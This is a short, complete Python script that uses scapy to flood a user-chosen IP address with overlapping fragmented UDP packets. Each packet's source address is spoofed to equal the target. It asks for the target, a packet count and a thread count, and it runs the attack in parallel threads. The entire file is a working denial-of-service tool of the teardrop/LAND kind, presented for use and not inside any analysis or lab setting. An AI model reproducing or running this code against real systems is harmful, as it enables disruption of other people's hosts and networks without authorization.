#!/usr/bin/env python
import random
from scapy.all import *
from threading import Thread
import os

def random_flags():
    # Possible IP flags combinations (3-bit field)
    flags_options = [0x0, 0x2, 0x4, 0x6]
    return random.choice(flags_options)

def attack(target, num_packets):
    for _ in range(num_packets):
        # Generate random sizes, offsets, and flags for the packets
        offset1 = random.randint(0, 100)
        offset2 = random.randint(0, 100)
        flags1 = random_flags()
        flags2 = random_flags()
        src_ip = target  # src_ip is the same as dst_ip

        # First fragmented packet
        i = IP()
        i.src = src_ip
        i.dst = target
        i.flags = flags1
        i.proto = 17  # UDP
        i.frag = offset1

        # Second fragmented packet with overlapping offset
        j = IP()
        j.src = src_ip
        j.dst = target
        j.flags = flags2
        j.proto = 17
        j.frag = offset2

        send(i, verbose=False)
        send(j, verbose=False)

    print(f"Attack finished on {target} from {src_ip}")

def main():
    os.system("clear")
    target = input("Destination IP: ")
    total_packets = int(input("How many packets: "))
    thread_count = int(input("How many threads: "))

    threads = []
    for _ in range(thread_count):
        thread = Thread(target=attack, args=(target, total_packets))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("All attacks finished")

if __name__ == "__main__":
    main()
    print("Done")
